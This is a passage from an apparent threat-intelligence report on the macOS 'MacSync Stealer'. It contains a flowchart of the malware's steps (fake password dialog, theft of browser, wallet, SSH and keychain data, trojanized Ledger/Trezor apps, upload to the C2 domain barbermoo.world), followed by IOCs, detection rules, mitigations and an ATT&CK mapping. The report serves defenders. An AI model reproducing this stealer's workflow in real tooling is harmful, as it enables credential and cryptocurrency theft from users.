id="L_M_N_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M262.805,1869.75L262.805,1873.917C262.805,1878.083,262.805,1886.417,343.207,1897.706C423.609,1908.995,584.414,1923.24,664.816,1930.363L745.219,1937.486" id="L_N_O_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M934.236,1481.311L991.876,1501.551C1049.516,1521.79,1164.795,1562.27,1222.435,1595.177C1280.074,1628.083,1280.074,1653.417,1280.074,1678.75C1280.074,1704.083,1280.074,1729.417,1280.074,1754.75C1280.074,1780.083,1280.074,1805.417,1280.074,1828.75C1280.074,1852.083,1280.074,1873.417,1225.789,1890.644C1171.503,1907.871,1062.933,1920.992,1008.647,1927.553L954.362,1934.113" id="L_L_O_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M849.797,1973.75L849.797,1977.917C849.797,1982.083,849.797,1990.417,849.797,1998.75C849.797,2007.083,849.797,2015.417,849.797,2023.75C849.797,2032.083,849.797,2040.417,849.797,2048.083C849.797,2055.75,849.797,2062.75,849.797,2066.25L849.797,2069.75" id="L_O_P_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M849.797,2127.75L849.797,2131.917C849.797,2136.083,849.797,2144.417,849.797,2152.083C849.797,2159.75,849.797,2166.75,849.797,2170.25L849.797,2173.75" id="L_P_Q_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M849.797,2255.75L849.797,2259.917C849.797,2264.083,849.797,2272.417,849.797,2280.083C849.797,2287.75,849.797,2294.75,849.797,2298.25L849.797,2301.75" id="L_Q_R_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M849.797,2359.75L849.797,2363.917C849.797,2368.083,849.797,2376.417,849.797,2384.083C849.797,2391.75,849.797,2398.75,849.797,2402.25L849.797,2405.75" id="L_R_S_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path></g><g class="edgeLabels"><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel" transform="translate(1247.46003, 620.89318)"><g class="label" transform="translate(-23.81640625, -12)"><foreignObject width="47.6328125" height="24"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "><p>Invalid</p></span></div></foreignObject></g></g><g class="edgeLabel" transform="translate(699.6484375, 864.5703125)"><g class="label" transform="translate(-17.37109375, -12)"><foreignObject width="34.7421875" height="24"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "><p>Valid</p></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel" transform="translate(262.8046875, 1602.75)"><g class="label" transform="translate(-11.32421875, -12)"><foreignObject width="22.6484375" height="24"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "><p>Yes</p></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel" transform="translate(1280.07421875, 1754.75)"><g class="label" transform="translate(-9.3984375, -12)"><foreignObject width="18.796875" height="24"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "><p>No</p></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g></g><g class="nodes"><g class="node default  " id="flowchart-A-0" transform="translate(699.6484375, 60)"><rect class="basic label-container" style="" x="-85.01953125" y="-27" width="170.0390625" height="54"></rect><g class="label" style="" transform="translate(-55.01953125, -12)"><rect></rect><foreignObject width="110.0390625" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Start Execution</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-B-1" transform="translate(699.6484375, 164)"><rect class="basic label-container" style="" x="-103.296875" y="-27" width="206.59375" height="54"></rect><g class="label" style="" transform="translate(-73.296875, -12)"><rect></rect><foreignObject width="146.59375" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Kill Terminal Process</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-C-3" transform="translate(699.6484375, 268)"><rect class="basic label-container" style="" x="-129.94921875" y="-27" width="259.8984375" height="54"></rect><g class="label" style="" transform="translate(-99.94921875, -12)"><rect></rect><foreignObject width="199.8984375" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Create /tmp/syncXXXXXXX/</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-D-5" transform="translate(699.6484375, 372)"><rect class="basic label-container" style="" x="-117.64453125" y="-27" width="235.2890625" height="54"></rect><g class="label" style="" transform="translate(-87.64453125, -12)"><rect></rect><foreignObject width="175.2890625" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Load payload to Memory</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-E-7" transform="translate(699.6484375, 538)"><rect class="basic label-container" style="" x="-130" y="-39" width="260" height="78"></rect><g class="label" style="" transform="translate(-100, -24)"><rect></rect><foreignObject width="200" height="48"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>Display Fake System Preferences</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-F-9" transform="translate(699.6484375, 739.28515625)"><polygon points="88.28515625,0 176.5703125,-88.28515625 88.28515625,-176.5703125 0,-88.28515625" class="label-container" transform="translate(-87.78515625, 88.28515625)"></polygon><g class="label" style="" transform="translate(-61.28515625, -12)"><rect></rect><foreignObject width="122.5703125" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Validate via dscl?</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-G-13" transform="translate(699.6484375, 928.5703125)"><rect class="basic label-container" style="" x="-121.06640625" y="-27" width="242.1328125" height="54"></rect><g class="label" style="" transform="translate(-91.06640625, -12)"><rect></rect><foreignObject width="182.1328125" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Capture System Password</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-H-15" transform="translate(156.203125, 1082.5703125)"><rect class="basic label-container" style="" x="-80.625" y="-27" width="161.25" height="54"></rect><g class="label" style="" transform="translate(-50.625, -12)"><rect></rect><foreignObject width="101.25" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Scan Browsers</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-H1-17" transform="translate(156.203125, 1198.5703125)"><rect class="basic label-container" style="" x="-113.203125" y="-27" width="226.40625" height="54"></rect><g class="label" style="" transform="translate(-83.203125, -12)"><rect></rect><foreignObject width="166.40625" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Cookies/Logins/History</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-I-19" transform="translate(549.8515625, 1082.5703125)"><rect class="basic label-container" style="" x="-107.16015625" y="-27" width="214.3203125" height="54"></rect><g class="label" style="" transform="translate(-77.16015625, -12)"><rect></rect><foreignObject width="154.3203125" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Target Crypto Wallets</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-I1-21" transform="translate(419.703125, 1198.5703125)"><rect class="basic label-container" style="" x="-100.296875" y="-27" width="200.59375" height="54"></rect><g class="label" style="" transform="translate(-70.296875, -12)"><rect></rect><foreignObject width="140.59375" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>40+ Web Extensions</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-I2-23" transform="translate(700, 1198.5703125)"><rect class="basic label-container" style="" x="-130" y="-39" width="260" height="78"></rect><g class="label" style="" transform="translate(-100, -24)"><rect></rect><foreignObject width="200" height="48"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>Desktop Wallets: Exodus/Ledger/etc.</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-J-25" transform="translate(999.59375, 1082.5703125)"><rect class="basic label-container" style="" x="-101.2265625" y="-27" width="202.453125" height="54"></rect><g class="label" style="" transform="translate(-71.2265625, -12)"><rect></rect><foreignObject width="142.453125" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>System &amp; Dev Creds</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-J1-27" transform="translate(999.59375, 1198.5703125)"><rect class="basic label-container" style="" x="-119.59375" y="-27" width="239.1875" height="54"></rect><g class="label" style="" transform="translate(-89.59375, -12)"><rect></rect><foreignObject width="179.1875" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>SSH/AWS/Kube/Keychain</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-K-29" transform="translate(1294.7734375, 1082.5703125)"><rect class="basic label-container" style="" x="-74.72265625" y="-27" width="149.4453125" height="54"></rect><g class="label" style="" transform="translate(-44.72265625, -12)"><rect></rect><foreignObject width="89.4453125" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>File Grabber</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-K1-31" transform="translate(1294.7734375, 1198.5703125)"><rect class="basic label-container" style="" x="-125.5859375" y="-27" width="251.171875" height="54"></rect><g class="label" style="" transform="translate(-95.5859375, -12)"><rect></rect><foreignObject width="191.171875" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>.wallet/.seed/.kdbx/.pem</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-L-36" transform="translate(849.796875, 1451.66015625)"><polygon points="114.08984375,0 228.1796875,-114.08984375 114.08984375,-228.1796875 0,-114.08984375" class="label-container" transform="translate(-113.58984375, 114.08984375)"></polygon><g class="label" style="" transform="translate(-87.08984375, -12)"><rect></rect><foreignObject width="174.1796875" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Ledger/Trezor Installed?</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-M-38" transform="translate(262.8046875, 1678.75)"><rect class="basic label-container" style="" x="-130" y="-39" width="260" height="78"></rect><g class="label" style="" transform="translate(-100, -24)"><rect></rect><foreignObject width="200" height="48"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>Download Trojanized app.asar</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N-40" transform="translate(262.8046875, 1830.75)"><rect class="basic label-container" style="" x="-130" y="-39" width="260" height="78"></rect><g class="label" style="" transform="translate(-100, -24)"><rect></rect><foreignObject width="200" height="48"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>Overwrite &amp; Ad-hoc Resign App</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-O-42" transform="translate(849.796875, 1946.75)"><rect class="basic label-container" style="" x="-100.59375" y="-27" width="201.1875" height="54"></rect><g class="label" style="" transform="translate(-70.59375, -12)"><rect></rect><foreignObject width="141.1875" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Prepare Exfiltration</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-P-46" transform="translate(849.796875, 2100.75)"><rect class="basic label-container" style="" x="-126.64453125" y="-27" width="253.2890625" height="54"></rect><g class="label" style="" transform="translate(-96.64453125, -12)"><rect></rect><foreignObject width="193.2890625" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Zip to /tmp/osalogging.zip</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-Q-48" transform="translate(849.796875, 2216.75)"><rect class="basic label-container" style="fill:#999999 !important;stroke:#000000 !important;stroke-width:4px !important" x="-130" y="-39" width="260" height="78"></rect><g class="label" style="" transform="translate(-100, -24)"><rect></rect><foreignObject width="200" height="48"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>C2 Upload: barbermoo.world</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-R-50" transform="translate(849.796875, 2332.75)"><rect class="basic label-container" style="" x="-94.6875" y="-27" width="189.375" height="54"></rect><g class="label" style="" transform="translate(-64.6875, -12)"><rect></rect><foreignObject width="129.375" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>rm -rf /tmp/sync*</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-S-52" transform="translate(849.796875, 2436.75)"><rect class="basic label-container" style="" x="-72.4453125" y="-27" width="144.890625" height="54"></rect><g class="label" style="" transform="translate(-42.4453125, -12)"><rect></rect><foreignObject width="84.890625" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Exit Process</p></span></div></foreignObject></g></g></g></g></g></svg>

#### 11. Indicators of Compromise (IOCs) – Actionable for Blue Teams

| Type         | Indicator                                                                                                        | Notes                             |
| ------------ | ---------------------------------------------------------------------------------------------------------------- | --------------------------------- |
| Domain       | barbermoo.world                                                                                                  | Dead C2 (404s); sinkhole/monitor. |
| URLs         | barbermoo.world/ledger/token<br>barbermoo.world/trezor/token<br>barbermoo.world/dynamic <br>barbermoo.world/gate | Block; monitor outbound.          |
| Victim Token | c8f3897680b448c197b9c66144bf81d228633fbdebed788e1f0625a4de834825                                                 | Unique per build/victim.          |
| API Key      | 5190ef1733183a0dc63fb623357f56d6                                                                                 | In headers.                       |
| Files/Paths  | /tmp/osalogging.zip /tmp/sync[0-9]{7}/ /tmp/*.zip (ledger/trezor)                                                | Hunt for these.                   |
| Strings      | "MacSync Stealer" "1.1.2_release" "Build Tag: r2" Fake dialogue text                                             | YARA-friendly.                    |
| Processes    | osascript + curl to suspicious domains ditto zipping temp dirs                                                   | EDR behavioral rules.             |
| Network      | Outbound HTTP/HTTPS to barbermoo.world with specific UA + api-key header                                         | Proxy/IDS alerts.                 |


#### 12. Detection Recommendations

- EDR/XDR Behavioral rules for:

- osascript piping from curl. 

- Recursive copying of browser/wallet paths. 

- Password prompts with LockedIcon.icns + "System Preferences" title. 

- ditto creating ZIPs in /tmp. 

- XProtect/MRT: Apple likely updated signatures post-Jamf report (Dec 2025); ensure systems are current. 

- Network: Block barbermoo.world; alert on old Chrome UA from macOS + api-key header. 

- Endpoint Hunting: Search for /tmp/sync*/ or osalogging.zip; check LaunchAgents for persistence (though this variant has none). 

#### 13. Mitigation & Response

- Prevention: Block unsigned/notarized apps; educate on pirated software risks; use hardware wallets. 

- If Compromised: Full password reset (all accounts, especially crypto); wipe/reimage; monitor for trojanized Ledger/Trezor apps. 

- Threat Intel: MacSync is evolving fast – monitor Jamf, SentinelOne, CrowdStrike for newer IOCs. 
  

#### 14. MITRE ATT&CK Tactics & Techniques

| ATT&CK Tactic        | Technique ID & Name                                                                                  | Description in This Sample            |
| -------------------- | ---------------------------------------------------------------------------------------------------- | ------------------------------------- |
| Initial Access       | T1566 – Phishing                                                                                     | Fake installers/DMGs                  |
| Execution            | T1059.007 – Command and Scripting Interpreter: AppleScript T1204.002 – User Execution                | osascript execution; user runs loader |
| Persistence          | T1574 – Hijack Execution Flow (app.asar replacement)                                                 | Trojanizes Ledger/Trezor apps         |
| Privilege Escalation | T1055 – Process Injection (none direct) T1548 – Abuse Elevation Control (phished password)           | Uses captured password for access     |
| Credential Access    | T1555.003 – Credentials from Password Stores: Keychain T1552 – Unsecured Credentials                 | Keychain dump; wallet seeds           |
| Discovery            | T1082 – System Information Discovery T1057 – Process Discovery                                       | system_profiler; file enumeration     |
| Collection           | T1005 – Data from Local System T1113 – Screen Capture (none) T1056 – Input Capture (phishing dialog) | Browser/wallet/file grabbing          |
| Command and Control  | T1071 – Application Layer Protocol                                                                   | HTTP curl to C2                       |
| Exfiltration         | T1041 – Exfiltration Over C2                                                                         | Intended POST of ZIP                  |
| Impact               | T1486 – Data Encrypted for Impact (none)                                                             | Crypto theft via backdoor             |

  
  

#### 15. References

- https://www.jamf.com/blog/macsync-stealer-evolution-code-signed-swift-malware-analysis/

- https://www.jamf.com/blog/macsync-stealer-evolution-code-signed-swift-malware-analysis/

- https://www.jamf.com/blog/macsync-stealer-evolution-code-signed-swift-malware-analysis/
